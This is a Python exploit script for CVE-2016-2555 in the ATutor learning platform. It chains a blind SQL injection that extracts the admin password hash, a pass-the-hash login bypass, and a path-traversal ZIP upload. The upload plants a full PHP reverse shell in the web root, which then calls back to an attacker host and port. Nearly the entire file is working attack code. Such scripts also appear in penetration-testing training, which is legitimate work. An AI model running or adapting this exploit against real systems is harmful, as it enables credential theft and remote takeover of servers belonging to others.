# Developed by : Alaa (aka b1tByte)
import requests 
import hashlib
import zipfile
from io import StringIO
from termcolor import colored


class CVE_2016_2555:
	vulnerableFunction = "http://[targetIP]/ATutor/mods/_standard/social/index_public.php?q="
	loginFunction = "http://[targetIP]/ATutor/login.php"
	md5Chars = "abcdef0123456789"

	def __init__ (self,maxHashLength,username,tableName):
		self.maxHashLength = maxHashLength
		self.username = username
		self.tableName = tableName
		self.userHash = ""



	# ---------------------------------------------------------------------------------------- #
	# This function replaces spaces within the query with mysql spaces /**/                    #
	# ---------------------------------------------------------------------------------------- #
	def replaceSpaces(self,query):
		wellFormedQuery = query.replace(" ","/**/")
		return wellFormedQuery;
	############################################################################################
  
  
	# ---------------------------------------------------------------------------------------- #
	# This function builds the blind sql query                                                 #
	# ---------------------------------------------------------------------------------------- #
	def getHashQuery(self,username,char,charIndex,tableName):
		query = "test') or (SELECT ascii(substr(password," + str(charIndex) + ",1)) FROM " + str(tableName) + " WHERE login = '" + str(username) + "') = ascii('" + str(char) + "')" + " %23"
		query = self.replaceSpaces(query)
		return query
	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function retrieves the hash of the user using blind sqli                            #
	# ---------------------------------------------------------------------------------------- #
	def getHash(self):
		# loop over each char postion 
		i = 1
		while i <= self.maxHashLength:
			# loop over each md5 charachter
			for char in self.md5Chars:
				response = requests.get(self.vulnerableFunction + self.getHashQuery(self.username,char,i,self.tableName))
				length = int(response.headers['Content-Length'])
				case = self.BlindSQLiCases(length)
				#print(response.request.url)
				#print(length)
				if case:
					print(colored("[+] Found char %s at index %d" %(char,i),"green"))
					self.userHash += char
					break
			i +=1
		return self
	############################################################################################


	# ------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
	# This function does the following :																													              #
	# 1 - Log in with the disclosed hash (using the pass the hash vulnerability)      																					  #
	# 2 - Upload a ZIP that contains a PHP file and extract it into the web root		                                                                                  #
	# 3 - Gain remote code execution!							                                                    													  #
	# --------------------------------------------------------------------     																			                  #
	# the login equation from the code : ...AND SHA1(CONCAT(password, $_SESSION['token']))=$this_password;															      #
	# so to bypass this equation we need to pass the following values:																	                                  #
	#	# 1 - $_SESSION['token'] : i will put user's hash 																									              #
	#	# 2 - $_POST['form_password_hidden'] : concatenate the token value with user's password hash ( extracted from blind sqli ), and then hash the result with SHA1    #
	#	#  then the right side of the equation will be equal to the left side which calculated in the server side 	                                                      #
	# ------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
	def bypassLogin(self, LHOST,LPORT):
		# 1 - Log in with the disclosed hash (using the pass the hash vulnerability) 
		print(colored("[i] Trying to bypass the login page","yellow"))
		# the left side of the equation 
		token = self.userHash
		# the right side 
		form_password_hidden = token + self.userHash
		# apply sha1
		hashObject = hashlib.sha1(form_password_hidden.encode('utf-8'))
		form_password_hidden = hashObject.hexdigest()
		
		# creating a persistent session object
		session = requests.Session() 
		data = "form_login_action=true&form_course_id=0&form_password_hidden=" + str(form_password_hidden) + "&p=&form_login="+ str(self.username)+"&form_password=&submit=Login&token=" + str(token)
		response = session.post(self.loginFunction,data=data)
		html = response.text
		if "Toggle course administration tools on or off" in html:
			print (colored("[++] Bypassed login page successfully!","cyan"))

		# 2 - Upload a ZIP that contains a PHP file and extract it into the web root
		print(colored("[i] Creating the zip file & appending the Reverse Shell file to it","yellow"))
		# creating the Zip file 
		with zipfile.ZipFile('zipFile.zip', 'a') as myzip:
			# appending malformed xml file into the zip file
			myzip.writestr('imsmanifest.xml', 'invalid xml!')
			# revshell payload
			phpPayload = "<?php set_time_limit(0);$VERSION=\"1.0\";$ip=\'"+ str(LHOST)+"\';$port=" + str(LPORT)+";$chunk_size=1400;$write_a=null;$error_a=null;$shell=\'uname -a; w; id; /bin/sh -i\';$daemon=0;$debug=0;if(function_exists(\'pcntl_fork\')){$pid=pcntl_fork();if($pid==-1){printit(\"ERROR: Can\'t fork\");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit(\"Error: Can\'t setsid()\");exit(1);}$daemon=1;}else {printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit(\"$errstr ($errno)\");exit(1);}$descriptorspec=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit(\"ERROR: Can\'t spawn shell\");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit(\"Successfully opened reverse shell to $ip:$port\");while(1){if(feof($sock)){printit(\"ERROR: Shell connection terminated\");break;}if(feof($pipes[1])){printit(\"ERROR: Shell process terminated\");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit(\"SOCK READ\");$input=fread($sock,$chunk_size);if($debug)printit(\"SOCK: $input\");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit(\"STDOUT READ\");$input=fread($pipes[1],$chunk_size);if($debug)printit(\"STDOUT: $input\");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit(\"STDERR READ\");$input=fread($pipes[2],$chunk_size);if($debug)printit(\"STDERR: $input\");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print\"$string\\n\";}}?>"
			# appending the php revshell file into the zip file 
			myzip.writestr('../../../../../var/www/html/ATutor/mods/poc/revshell.phtml', phpPayload)
			# uploading the zip file 
			print(colored("[i] Uploading the zip file into the server","yellow"))
			r = session.post('http://[targetIP]/ATutor/mods/_standard/tests/import_test.php',
                    headers={'Content-Disposition': 'form-data; name="file"; filename="zipFile.zip"'.format("zipFile.zip"), 
                                   'content-type': 'application/zip'})
			#3 - Gain remote code execution!
			print(colored("[i] Executing the reverse shell file","cyan"))
			execute = requests.get("http://[targetIP]//ATutor/mods/poc/revshell.phtml")
	############################################################################################


	# ---------------------------------------------------------------------------------------- #
	# This function test Blind SQLi cases                                                      #
        # Atutor Blind SQLi Cases :                                                                #
	#         1 - False : Content-Length is equal to 20 bytes                                  #
	#         2 - True :  Content-Length is greater than 20 bytes                              #
	# ---------------------------------------------------------------------------------------- #
	def BlindSQLiCases(self,length):
		case = False
		if (length > 20):
			case = True
		return case
	############################################################################################



username = "admin"
tableName = "AT_admins"
LHOST = "x.x.x.x"
LPORT = "1234"
print(colored("[i] Retrieving admin password hash","yellow"))
obj = CVE_2016_2555(40,username,tableName);
obj.getHash()
print(colored("[++] Password Hash for user %s is %s" %(username,obj.userHash),"cyan"))
obj.bypassLogin(LHOST,LPORT)


